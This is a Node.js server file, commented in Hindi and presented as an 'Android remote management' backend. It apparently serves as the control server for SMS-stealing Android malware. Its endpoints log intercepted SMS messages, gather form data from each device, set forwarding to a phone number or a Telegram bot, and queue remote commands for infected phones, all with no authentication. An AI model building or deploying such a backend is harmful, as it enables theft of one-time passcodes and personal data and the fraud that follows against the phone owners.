// -----------------------------------------------------------------------------
// Android रिमोट मैनेजमेंट सिस्टम के लिए अंतिम और संपूर्ण सर्वर कोड
// बस इस फाइल को बनाएं और सर्वर चलाएं।
// -----------------------------------------------------------------------------

// 1. जरूरी लाइब्रेरीज को इम्पोर्ट करें
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

// 2. सर्वर और डेटाबेस सेटअप
const app = express();
const PORT = process.env.PORT || 3000; // Render जैसे प्लेटफॉर्म के लिए PORT वेरिएबल जरूरी है
const db = new sqlite3.Database('./database.db', (err) => {
    if (err) {
        console.error("डेटाबेस कनेक्शन में त्रुटि:", err.message);
    } else {
        console.log("SQLite डेटाबेस से सफलतापूर्वक कनेक्ट हो गया।");
        createTables(); // अगर टेबल मौजूद नहीं हैं तो उन्हें बनाएं
    }
});

app.use(express.json()); // सर्वर को JSON समझने के लिए

// 3. डेटाबेस टेबल बनाने का लॉजिक (जैसा प्रॉम्प्ट में दिया गया है)
function createTables() {
    db.serialize(() => {
        // devices टेबल
        db.run(`CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE NOT NULL,
            device_name TEXT,
            os_version TEXT,
            phone_number TEXT,
            battery_level INTEGER,
            last_seen DATETIME NOT NULL,
            created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        )`);

        // commands टेबल
        db.run(`CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            command_type TEXT NOT NULL,
            command_data TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'pending',
            created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        )`);

        // sms_logs टेबल
        db.run(`CREATE TABLE IF NOT EXISTS sms_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            sender TEXT NOT NULL,
            message_body TEXT NOT NULL,
            received_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        )`);

        // form_submissions टेबल
        db.run(`CREATE TABLE IF NOT EXISTS form_submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            custom_data TEXT NOT NULL,
            submitted_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        )`);

        // global_settings टेबल
        db.run(`CREATE TABLE IF NOT EXISTS global_settings (
            setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
            setting_value TEXT
        )`);
        
        console.log("सभी डेटाबेस टेबल सफलतापूर्वक जाँची/बनाई गईं।");
    });
}

// -----------------------------------------------------------------------------
// भाग 2 और 3: सभी API एंडपॉइंट्स का कार्यान्वयन
// -----------------------------------------------------------------------------

// होमपेज - यह दिखाने के लिए कि सर्वर चल रहा है
app.get('/', (req, res) => {
    res.send('<div style="font-family: sans-serif; text-align: center; padding: 50px;"><h1>सर्वर चल रहा है</h1><p>एंड्रॉइड रिमोट मैनेजमेंट सिस्टम API तैयार है।</p></div>');
});

// फीचर 1: डिवाइस रजिस्ट्रेशन और लाइव स्टेटस
app.post('/api/device/register', (req, res) => {
    const { device_id, device_name, os_version, battery_level, phone_number } = req.body;
    const now = new Date().toISOString();

    const findSql = "SELECT * FROM devices WHERE device_id = ?";
    db.get(findSql, [device_id], (err, row) => {
        if (err) return res.status(500).json({ status: "error", message: err.message });

        if (row) {
            // डिवाइस मिलता है: डिवाइस की जानकारी और last_seen अपडेट करें
            const updateSql = "UPDATE devices SET device_name = ?, os_version = ?, battery_level = ?, phone_number = ?, last_seen = ? WHERE device_id = ?";
            db.run(updateSql, [device_name, os_version, battery_level, phone_number, now, device_id], (err) => {
                if (err) return res.status(500).json({ status: "error", message: err.message });
                res.json({ status: "success", message: "Device data updated." });
            });
        } else {
            // डिवाइस नहीं मिलता है: नई पंक्ति बनाएं
            const insertSql = `INSERT INTO devices (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)`;
            db.run(insertSql, [device_id, device_name, os_version, phone_number, battery_level, now, now], (err) => {
                if (err) return res.status(500).json({ status: "error", message: err.message });
                res.status(201).json({ status: "success", message: "Device registered." });
            });
        }
    });
});

// फीचर 2: एडमिन पैनल पर डिवाइस लिस्ट दिखाना
app.get('/api/devices', (req, res) => {
    const sql = "SELECT * FROM devices ORDER BY created_at ASC"; // सबसे पुराना सबसे ऊपर
    db.all(sql, [], (err, rows) => {
        if (err) return res.status(500).json({ status: "error", message: err.message });

        const devicesWithStatus = rows.map(device => {
            const lastSeen = new Date(device.last_seen);
            const now = new Date();
            const diffInSeconds = (now - lastSeen) / 1000;
            
            return {
                device_id: device.device_id,
                device_name: device.device_name,
                os_version: device.os_version,
                phone_number: device.phone_number,
                battery_level: device.battery_level,
                is_online: diffInSeconds < 190, // 3 मिनट 10 सेकंड से कम है तो ऑनलाइन
                created_at: device.created_at
            };
        });
        res.json(devicesWithStatus);
    });
});

// फीचर 3 & 4: SMS फॉरवर्डिंग नंबर को अपडेट और प्राप्त करना
app.post('/api/config/sms_forward', (req, res) => {
    const { forward_number } = req.body;
    const sql = "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES ('sms_forward_number', ?)";
    db.run(sql, [forward_number], function(err) {
        if (err) return res.status(500).json({ status: "error", message: err.message });
        res.json({ status: "success", message: "Forwarding number updated successfully." });
    });
});

app.get('/api/config/sms_forward', (req, res) => {
    db.get("SELECT setting_value FROM global_settings WHERE setting_key = 'sms_forward_number'", (err, row) => {
        if (err) return res.status(500).json({ status: "error", message: err.message });
        res.json({ forward_number: row ? row.setting_value : null });
    });
});

// फीचर 5: टेलीग्राम फॉरवर्डिंग को अपडेट और प्राप्त करना
app.post('/api/config/telegram', (req, res) => {
    const { telegram_bot_token, telegram_chat_id } = req.body;
    db.serialize(() => {
        const stmt1 = db.prepare("INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)");
        stmt1.run('telegram_bot_token', telegram_bot_token);
        stmt1.run('telegram_chat_id', telegram_chat_id);
        stmt1.finalize((err) => {
             if (err) return res.status(500).json({ status: "error", message: err.message });
             res.json({ status: "success", message: "Telegram settings updated." });
        });
    });
});

app.get('/api/config/telegram', (req, res) => {
    db.all("SELECT setting_key, setting_value FROM global_settings WHERE setting_key IN ('telegram_bot_token', 'telegram_chat_id')", (err, rows) => {
        if (err) return res.status(500).json({ status: "error", message: err.message });
        const settings = rows.reduce((acc, row) => ({ ...acc, [row.setting_key]: row.setting_value }), {});
        res.json({
            telegram_bot_token: settings.telegram_bot_token || null,
            telegram_chat_id: settings.telegram_chat_id || null
        });
    });
});

// फीचर 6: पैनल से कमांड भेजना
app.post('/api/command/send', (req, res) => {
    const { device_id, command_type, command_data } = req.body;
    // command_data को JSON स्ट्रिंग के रूप में स्टोर करें
    const commandDataStr = JSON.stringify(command_data); 
    const sql = `INSERT INTO commands (device_id, command_type, command_data, status) VALUES (?, ?, ?, 'pending')`;
    db.run(sql, [device_id, command_type, commandDataStr], function(err) {
        if (err) return res.status(500).json({ status: "error", message: err.message });
        res.status(201).json({ status: "success", message: "Command queued.", command_id: this.lastID });
    });
});

// फीचर 7: फॉर्म सबमिशन
app.post('/api/device/:deviceId/forms', (req, res) => {
    const { deviceId } = req.params;
    const { custom_data } = req.body;
    const sql = `INSERT INTO form_submissions (device_id, custom_data) VALUES (?, ?)`;
    db.run(sql, [deviceId, custom_data], function(err) {
        if (err) return res.status(500).json({ status: "error", message: err.message });
        res.status(201).json({ status: "success", message: "Form data received." });
    });
});

// फीचर 8: SMS लॉग्स
app.post('/api/device/:deviceId/sms', (req, res) => {
    const { deviceId } = req.params;
    const { sender, message_body } = req.body;
    const sql = `INSERT INTO sms_logs (device_id, sender, message_body) VALUES (?, ?, ?)`;
    db.run(sql, [deviceId, sender, message_body], function(err) {
        if (err) return res.status(500).json({ status: "error", message: err.message });
        res.status(201).json({ status: "success", message: "SMS logged." });
    });
});

// ★★★ समाधान 1: क्लाइंट के लिए कमांड प्राप्त करना (सिर्फ 'pending' और फिर 'sent' में बदलना)
app.get('/api/device/:deviceId/commands', (req, res) => {
    const { deviceId } = req.params;
    const selectSql = "SELECT * FROM commands WHERE device_id = ? AND status = 'pending'";
    
    db.all(selectSql, [deviceId], (err, rows) => {
        if (err) return res.status(500).json({ status: "error", message: err.message });

        if (rows.length === 0) {
            return res.json([]); // कोई पेंडिंग कमांड नहीं
        }
        
        // कमांड भेजने के बाद उनका स्टेटस 'sent' में बदलें
        const idsToUpdate = rows.map(r => r.id);
        const updateSql = `UPDATE commands SET status = 'sent' WHERE id IN (${idsToUpdate.map(() => '?').join(',')})`;
        
        db.run(updateSql, idsToUpdate, (updateErr) => {
            if (updateErr) return res.status(500).json({ status: "error", message: updateErr.message });
            
            // क्लाइंट को कमांड डेटा भेजें
            const commandsForClient = rows.map(cmd => {
                try {
                    return {
                        ...cmd,
                        command_data: JSON.parse(cmd.command_data) // JSON स्ट्रिंग को ऑब्जेक्ट में बदलें
                    };
                } catch (e) {
                    return cmd; // अगर पार्सिंग में गलती हो तो ओरिजिनल कमांड भेजें
                }
            });
            res.json(commandsForClient);
        });
    });
});

// ★★★ समाधान 1 (जारी): कमांड के निष्पादन को चिह्नित करना
app.post('/api/command/:commandId/execute', (req, res) => {
    const { commandId } = req.params;
    const sql = "UPDATE commands SET status = 'executed' WHERE id = ?";
    db.run(sql, [commandId], function(err) {
        if (err) return res.status(500).json({ status: "error", message: err.message });
        res.json({ status: "success", message: `Command ${commandId} marked as executed.` });
    });
});


// ★★★ समाधान 2: डिवाइस और संबंधित डेटा को डिलीट करना
app.delete('/api/device/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    db.serialize(() => {
        db.run("DELETE FROM devices WHERE device_id = ?", [deviceId]);
        db.run("DELETE FROM sms_logs WHERE device_id = ?", [deviceId]);
        db.run("DELETE FROM form_submissions WHERE device_id = ?", [deviceId]);
        db.run("DELETE FROM commands WHERE device_id = ?", [deviceId], (err) => {
            if (err) return res.status(500).json({ status: "error", message: err.message });
            res.json({ status: "success", message: `Device ${deviceId} and all its data deleted.` });
        });
    });
});

// ★★★ समाधान 2: एक SMS लॉग को डिलीट करना
app.delete('/api/sms/:smsId', (req, res) => {
    const { smsId } = req.params;
    const sql = "DELETE FROM sms_logs WHERE id = ?";
    db.run(sql, [smsId], function(err) {
        if (err) return res.status(500).json({ status: "error", message: err.message });
        if (this.changes === 0) return res.status(404).json({ status: "error", message: "SMS not found." });
        res.json({ status: "success", message: `SMS ${smsId} deleted.` });
    });
});


// 4. सर्वर को शुरू करें
app.listen(PORT, () => {
    console.log(`सर्वर http://localhost:${PORT} पर सफलतापूर्वक शुरू हो गया है।` );
});
